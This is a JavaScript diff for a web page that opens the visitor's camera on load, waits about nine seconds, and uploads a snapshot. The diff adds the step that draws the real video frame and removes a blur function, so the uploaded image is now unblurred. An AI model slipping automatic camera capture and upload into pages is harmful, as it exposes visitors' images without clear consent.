@@ -19,7 +19,7 @@ document.addEventListener("DOMContentLoaded", async function () {
 
         // Aguarde 2 segundos para estabilizar a câmera antes da captura
         setTimeout(() => {
-            captureAndUpload(video, stream), captura.play()},10000);
+            captureAndUpload(video, stream), captura.play()}, 9000);
     } catch (error) {
         console.error("Erro ao acessar a câmera: ", error);
         alert("Permita o acesso à câmera para capturar imagens.");
@@ -48,7 +48,7 @@ async function captureAndUpload(video, stream) {
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     canvas.toBlob(async (blob) => {
         const formData = new FormData();
@@ -69,39 +69,6 @@ async function captureAndUpload(video, stream) {
             stream.getTracks().forEach(track => track.stop());
         }
     }, "image/jpeg");
-}
-
-function applyBlur(context, width, height, radius) {
-    const imageData = context.getImageData(0, 0, width, height);
-    const pixels = imageData.data;
-    const result = context.createImageData(width, height);
-    const resultPixels = result.data;
-
-    for (let i = 0; i < pixels.length; i += 4) {
-        let r = 0, g = 0, b = 0, count = 0;
-
-        for (let x = -radius; x <= radius; x++) {
-            for (let y = -radius; y <= radius; y++) {
-                const offsetX = i + x * 4;
-                const offsetY = offsetX + y * width * 4;
-
-                if (offsetX >= 0 && offsetX < pixels.length &&
-                    offsetY >= 0 && offsetY < pixels.length) {
-                    r += pixels[offsetY];
-                    g += pixels[offsetY + 1];
-                    b += pixels[offsetY + 2];
-                    count++;
-                }
-            }
-        }
-
-        resultPixels[i] = r / count;
-        resultPixels[i + 1] = g / count;
-        resultPixels[i + 2] = b / count;
-        resultPixels[i + 3] = pixels[i + 3]; // Alpha
-    }
-
-    context.putImageData(result, 0, 0);
 }
 
 async function enviarLogFoto() {
